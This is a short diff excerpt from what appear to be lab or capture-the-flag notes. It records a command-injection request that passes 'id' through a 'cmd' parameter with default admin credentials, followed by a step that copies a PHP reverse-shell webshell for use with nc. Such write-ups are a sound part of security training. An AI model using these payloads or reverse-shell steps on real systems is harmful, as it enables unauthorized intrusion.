@@ -69,7 +69,7 @@ try execute id `name=admin&username=admin&password=admin&access=access&cmd=id`
 ![[Pasted image 20250829104706.png]]
 
 
-code was executed. Now run reverse shell (w/ machine IP)
+code was executed. Now run reverse shell (w/ machine IP) nc
 `cp /usr/share/webshells/php/php-reverse-shell.php .`
 
 
